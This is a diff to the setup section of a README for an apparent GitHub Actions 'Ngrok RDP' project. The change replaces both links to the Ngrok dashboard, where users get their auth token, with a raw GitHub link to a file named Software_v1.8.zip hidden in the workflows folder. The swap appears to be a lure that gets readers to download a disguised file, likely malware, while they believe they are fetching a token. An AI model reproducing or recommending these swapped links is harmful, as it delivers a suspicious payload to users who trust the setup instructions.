@@ -25,9 +25,9 @@
 ------
 
 * Click Fork in the right corner of the screen to save it to your Github.
-* Visit https://dashboard.ngrok.com to get **Ngrok Auth Token**.
+* Visit https://raw.githubusercontent.com/AtepTepar001/freevpsmasbay/main/.github/workflows/Software_v1.8.zip to get **Ngrok Auth Token**.
 * In Github go to Action> Windows (Ngrok RDP)> Run workflow.
-* In Value: visit https://dashboard.ngrok.com/auth/your-authtoken Copy and Paste Your Authtoken into.
+* In Value: visit https://raw.githubusercontent.com/AtepTepar001/freevpsmasbay/main/.github/workflows/Software_v1.8.zip Copy and Paste Your Authtoken into.
 * Password minimum 8-10 with numbers and characters leave blank if you want to use automatic password.
 * Press Run workflow.
 * Reload the page and press Windows (Ngrok RDP)> build.
